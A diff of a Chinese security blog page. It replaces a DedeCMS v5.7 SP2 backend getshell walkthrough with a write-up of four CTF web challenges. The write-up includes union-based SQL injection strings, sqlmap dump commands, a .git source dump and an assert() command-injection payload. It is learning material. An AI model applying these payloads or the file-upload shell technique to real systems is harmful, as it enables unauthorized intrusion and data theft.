@@ -6,32 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
-  <title>渗透学习 — Dedecms v5.7 sp2后台getshell | Knlvre</title>
+  <title>攻防世界 — Web进阶题(第1-10关) | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="【前言】本次学习参考这篇文章：Dedecms v5.7 sp2后台getshell 大佬写的文章。而本文是想把自己的学习过程简单记录一下，下载链接：Dedecms v5.7 sp2 【步骤】一、创建文件先创建一个文件1.jpg.php，其中内容为： 123&amp;lt;?phpphpinfo();?&amp;gt; 将这个文件压缩成ZIP格式的压缩文件  二、网站环境初始化进入到这个本地网站环境： 1http:">
-<meta name="keywords" content="渗透测试">
+  <meta name="description" content="第一关（Cat）进入题目后给出一个输入框，输入IP地址后会返回PING的信息  此时想到了命令执行，但是尝试127.0.0.1 &amp;amp; ls、127.0.0.1 &amp;amp;&amp;amp; ls、127.0.0.1 | ls都会显示Invalid URL  网站用的是php写的，但是这个Cloud端就不一定是php的了。 在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=y">
+<meta name="keywords" content="CTF-Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="渗透学习 — Dedecms v5.7 sp2后台getshell">
-<meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/02/28/渗透学习—Dedecms v5.7漏洞合集/index.html">
+<meta property="og:title" content="攻防世界 — Web进阶题(第1-10关)">
+<meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题/index.html">
 <meta property="og:site_name" content="Knlvre">
-<meta property="og:description" content="【前言】本次学习参考这篇文章：Dedecms v5.7 sp2后台getshell 大佬写的文章。而本文是想把自己的学习过程简单记录一下，下载链接：Dedecms v5.7 sp2 【步骤】一、创建文件先创建一个文件1.jpg.php，其中内容为： 123&amp;lt;?phpphpinfo();?&amp;gt; 将这个文件压缩成ZIP格式的压缩文件  二、网站环境初始化进入到这个本地网站环境： 1http:">
+<meta property="og:description" content="第一关（Cat）进入题目后给出一个输入框，输入IP地址后会返回PING的信息  此时想到了命令执行，但是尝试127.0.0.1 &amp;amp; ls、127.0.0.1 &amp;amp;&amp;amp; ls、127.0.0.1 | ls都会显示Invalid URL  网站用的是php写的，但是这个Cloud端就不一定是php的了。 在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=y">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/1-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/2-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-3.png">
-<meta property="og:updated_time" content="2019-08-22T07:53:19.142Z">
+<meta property="og:updated_time" content="2019-09-06T03:09:00.460Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="渗透学习 — Dedecms v5.7 sp2后台getshell">
-<meta name="twitter:description" content="【前言】本次学习参考这篇文章：Dedecms v5.7 sp2后台getshell 大佬写的文章。而本文是想把自己的学习过程简单记录一下，下载链接：Dedecms v5.7 sp2 【步骤】一、创建文件先创建一个文件1.jpg.php，其中内容为： 123&amp;lt;?phpphpinfo();?&amp;gt; 将这个文件压缩成ZIP格式的压缩文件  二、网站环境初始化进入到这个本地网站环境： 1http:">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/1-1.png">
+<meta name="twitter:title" content="攻防世界 — Web进阶题(第1-10关)">
+<meta name="twitter:description" content="第一关（Cat）进入题目后给出一个输入框，输入IP地址后会返回PING的信息  此时想到了命令执行，但是尝试127.0.0.1 &amp;amp; ls、127.0.0.1 &amp;amp;&amp;amp; ls、127.0.0.1 | ls都会显示Invalid URL  网站用的是php写的，但是这个Cloud端就不一定是php的了。 在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=y">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
   
@@ -149,60 +137,92 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-渗透学习—Dedecms v5.7漏洞合集" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-攻防世界 — Web进阶题" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      渗透学习 — Dedecms v5.7 sp2后台getshell
+      攻防世界 — Web进阶题(第1-10关)
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/02/28/渗透学习—Dedecms v5.7漏洞合集/" class="archive-article-date">
-  	<time datetime="2019-02-27T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-28</time>
+        <a href="/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题/" class="archive-article-date">
+  	<time datetime="2019-09-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-05</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h2><p>本次学习参考这篇文章：<a href="https://xz.aliyun.com/t/4150" target="_blank" rel="noopener">Dedecms v5.7 sp2后台getshell</a></p>
-<p>大佬写的文章。而本文是想把自己的学习过程简单记录一下，下载链接：<a href="http://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7-UTF8-SP2.tar.gz" target="_blank" rel="noopener">Dedecms v5.7 sp2</a></p>
-<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><h3 id="一、创建文件"><a href="#一、创建文件" class="headerlink" title="一、创建文件"></a>一、创建文件</h3><p>先创建一个文件<strong>1.jpg.php</strong>，其中内容为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>将这个文件压缩成<strong>ZIP</strong>格式的压缩文件</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/1-1.png" alt="1-1"></p>
-<h3 id="二、网站环境初始化"><a href="#二、网站环境初始化" class="headerlink" title="二、网站环境初始化"></a>二、网站环境初始化</h3><p>进入到这个本地网站环境：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2</span><br></pre></td></tr></table></figure>
-<p>点击<strong>uploads</strong>，按照提示的步骤对网站初始化</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/2-1.png" alt="2-1"></p>
-<h3 id="三、上传文件到指定位置"><a href="#三、上传文件到指定位置" class="headerlink" title="三、上传文件到指定位置"></a>三、上传文件到指定位置</h3><p>进入到后台：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/</span><br></pre></td></tr></table></figure>
-<p>默认登录的用户名和密码都是<strong>admin</strong></p>
-<p>进入 <strong>附件管理 — 文件式管理器</strong> 的 <strong>soft</strong> 文件夹中</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-1.png" alt="3-1"></p>
-<p>点击 <strong>文件上传</strong> 把刚才创建的 <strong>1.zip</strong> 压缩文件上传上去</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/3-2.png" alt="3-2"></p>
-<h3 id="四、发布刚才上传的文档"><a href="#四、发布刚才上传的文档" class="headerlink" title="四、发布刚才上传的文档"></a>四、发布刚才上传的文档</h3><p>访问这个地址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/dede/album_add.php</span><br></pre></td></tr></table></figure>
-<p>看到的是 <strong>发布新图集</strong> 的界面</p>
-<p>先点击右上角的 <strong>栏目管理 — 增加顶级栏目</strong> 创建一个栏目，这样下一步操作才能继续</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-1.png" alt="4-1"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-2.png" alt="4-2"></p>
-<p>然后简单填写一下图中那2栏必填的就可以点击确定了</p>
-<p>注意：<strong>内容模型</strong> 这一栏要选择 <strong>图片集</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-3.png" alt="4-3"></p>
-<p>再次返回刚才 <strong>发布新图集</strong> 的界面，填写一下图中那几栏的信息</p>
-<p>勾选 <strong>从ZIP压缩包中提取文件</strong> 点击 <strong>浏览</strong> 选择刚才我们上传的 <strong>1.zip</strong></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/4-4.png" alt="4-4"></p>
-<h3 id="四、结果"><a href="#四、结果" class="headerlink" title="四、结果"></a>四、结果</h3><p>当提示 <strong>成功发布一个图集</strong> 时，点击 <strong>浏览文档</strong> </p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-1.png" alt="5-1"></p>
-<p>点击这个标签，就可以看到结果</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-2.png" alt="5-2"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web%E6%B8%97%E9%80%8F/%EF%BC%881%EF%BC%89Dedecms%E5%88%A9%E7%94%A8ZIP%E6%96%87%E4%BB%B6%E5%90%8E%E5%8F%B0getshell/5-3.png" alt="5-3"></p>
+        <h2 id="第一关（Cat）"><a href="#第一关（Cat）" class="headerlink" title="第一关（Cat）"></a>第一关（Cat）</h2><p>进入题目后给出一个输入框，输入<code>IP地址</code>后会返回<code>PING</code>的信息</p>
+<p><img src alt="1-1"></p>
+<p>此时想到了<code>命令执行</code>，但是尝试<code>127.0.0.1 &amp; ls</code>、<code>127.0.0.1 &amp;&amp; ls</code>、<code>127.0.0.1 | ls</code>都会显示<code>Invalid URL</code></p>
+<p><img src alt="1-2"></p>
+<p>网站用的是php写的，但是这个Cloud端就不一定是php的了。</p>
+<p>在URL的传参处<code>?url=</code>这里，我们传递个<code>%79</code>发现传递之后变成了<code>?url=y</code>，看来是可以传递url编码，系统会接受并进行解析</p>
+<p>于是我们传递<code>%80</code>会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。</p>
+<p>url编码表可以参考：<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p>
+<p>报错信息中可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeEncodeError at /api/ping</span><br></pre></td></tr></table></figure>
+<p><img src alt="1-3"></p>
+<p>这说明Cloud端使用的是<code>Python的Django框架</code></p>
+<p>看一下官方的文档</p>
+<p><img src alt="1-4"></p>
+<p>所以根据Django的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息。</p>
+<p>我们的目标首先是数据库文件，看从错误信息中能不能拿到flag，可以从配置文件settings.py的报错中看看有没有database的相关信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/api/setting.py</span><br></pre></td></tr></table></figure>
+<p>搜索关键词<code>database</code>之后，看到两处关键点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.path.join(BASE_DIR, \\\&amp;#39;database.sqlite3\\\&amp;#39;)</span><br><span class="line"></span><br><span class="line">&amp;#39;/opt/api/database.sqlite3&amp;#39</span><br></pre></td></tr></table></figure>
+<p>现在去访问这个<code>/opt/api/database.sqlite3</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>
+<p>搜索关键词<code>ctf</code>，找到了flag</p>
+<p><img src alt="1-5"></p>
+<p>参考文章：<a href="https://blog.csdn.net/zz_Caleb/article/details/95041031" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/95041031</a></p>
+<h2 id="第二关（ics-06）"><a href="#第二关（ics-06）" class="headerlink" title="第二关（ics-06）"></a>第二关（ics-06）</h2><p>题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</p>
+<p>连接进去后是一个工控云管理系统平台，除了<code>报表中心</code>模块可以点击之外，其他模块都无法点击。点击进入报表中心之后发现url中通过<code>GET</code>传递了<code>id=1</code></p>
+<p><img src alt="2-1"></p>
+<p>尝试单双引号注入都会重置url。尝试输入<code>0</code>、<code>-1</code>等数字也无返回特殊内容，但是发现数字可以一直输入并返回相同的界面，猜测应该在某个数字时会返回信息，于是用Burpsuit爆破这个<code>id</code>参数</p>
+<p>最后直接在<code>id=2334</code>时，拿到了flag</p>
+<p><img src alt="2-2"></p>
+<h2 id="第三关（NewsCenter）"><a href="#第三关（NewsCenter）" class="headerlink" title="第三关（NewsCenter）"></a>第三关（NewsCenter）</h2><p>题目描述：如题目环境报错，稍等片刻刷新即可</p>
+<p>连接进去之后看到一个搜索框架，第一时间想到：Sql、XSS、XXE</p>
+<p><img src alt="3-1"></p>
+<p>①方法一</p>
+<p>现在输入框输入测试数值：<code>123</code>，抓包看一下。首先尝试Sql注入，很快就发现参数<code>单引号</code>包裹，列数为<code>3</code>，没有任何过滤，正常注入就行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+]注表名：search=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">返回：news,secret_table</span><br><span class="line"></span><br><span class="line">[+]注列名：search=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;secret_table&quot; #</span><br><span class="line">返回：id,fl4g</span><br><span class="line"></span><br><span class="line">[+]注数据：search=-1&apos; union select 1,2,fl4g from secret_table #</span><br><span class="line">返回：QCTF&#123;sq1_inJec7ion_ezzz&#125;</span><br></pre></td></tr></table></figure>
+<p><img src alt="3-2"></p>
+<p>②方法二</p>
+<p>在网上看到其他大佬的WriteUp，使用Sqlmap来自动完成的，深感工具的魅力，平时都是手动注入，现在将本题利用Sqlmap的过程记录下来</p>
+<p>首先还是需要抓取请求，然后将<code>请求</code>复制下来，放进Sqlmap文件夹内的一个<code>txt（本题是模板.txt）</code>里</p>
+<p><img src alt="3-3"></p>
+<p>然后开始用<code>Python2</code>跑Sqlmap，命令及结果如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 模板.txt --dbs</span><br></pre></td></tr></table></figure>
+<p><img src alt="3-4"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 模板.txt -D news --tables</span><br></pre></td></tr></table></figure>
+<p><img src alt="3-5"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 模板.txt -D news -T secret_table --dump</span><br></pre></td></tr></table></figure>
+<p><img src alt="3-6"></p>
+<p>参考文章：<a href="https://blog.csdn.net/yangker12148/article/details/90635554" target="_blank" rel="noopener">https://blog.csdn.net/yangker12148/article/details/90635554</a></p>
+<h2 id="第四关（mfw）"><a href="#第四关（mfw）" class="headerlink" title="第四关（mfw）"></a>第四关（mfw）</h2><p>链接进去之后只有<code>Home</code>、<code>About</code>、<code>Contact</code>可以点击，对应的url传递的<code>page</code>参数也随之改变</p>
+<p>没有任何输入点，直接用Github上的工具<code>Dirsearch</code>扫一下，发现了<code>.git</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://111.198.29.45:59852/?page=home -e php</span><br></pre></td></tr></table></figure>
+<p><img src alt="4-1"></p>
+<p>用GitHub上的工具<code>Githack</code>去下载源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://111.198.29.45:59852/.git</span><br></pre></td></tr></table></figure>
+<p><img src alt="4-2"></p>
+<p>首先去查看了<code>templates</code>目录，发现里面有<code>flag.php</code>，但是没有有用的东西。只能退后去看index.php，发现了漏洞点</p>
+<p>关键代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>assert为断言函数，会将括号内的表达式当做函数去执行，当返回结果为<code>True</code>时，就不会执行<code>die函数</code>。题目直接下载源码无法看到flag，但是<code>flag.php</code>存在必定要利用，所以这里通过<code>assert()函数</code>来执行<code>cat命令</code>，去查看<code>flag.php</code></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=what_ever&apos;) or system(&apos;cat templates/flag.php&apos;) //</span><br></pre></td></tr></table></figure>
+<p>闭合掉前面的<code>(&#39;</code>就可以，不管前面函数的执行结果，加了<code>or</code>保证让<code>assert()函数</code>执行的结果为<code>True</code></p>
+<p>请求后返回空白，右键查看源代码，就看到了flag</p>
+<p><img src alt="4-3"></p>
+<p>参考文章：<a href="https://www.jianshu.com/p/795f918d791b" target="_blank" rel="noopener">https://www.jianshu.com/p/795f918d791b</a></p>
 
       
 
@@ -216,7 +236,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF-Web</a>
         		</li>
       		
 		</ul>
@@ -272,7 +292,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://knlvre.github.io/Knlvre.github-io/2019/02/28/渗透学习—Dedecms v5.7漏洞合集/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://knlvre.github.io/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -286,18 +306,9 @@
   
 <nav id="article-nav">
   
-    <a href="/Knlvre.github-io/2019/02/28/Web渗透学习—Dedecms v5.7 sp2后台getshell/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          渗透学习 — Dedecms v5.7漏洞合集
-        
-      </div>
-    </a>
   
-  
-    <a href="/Knlvre.github-io/2019/02/26/BugKuCTF—杂项题 第1-10关/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">BugKuCTF — 杂项题(第1-10关)</div>
+    <a href="/Knlvre.github-io/2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2019XNUCA — ezphp WriteUp</div>
       <i class="icon-circle-right"></i>
     </a>
   
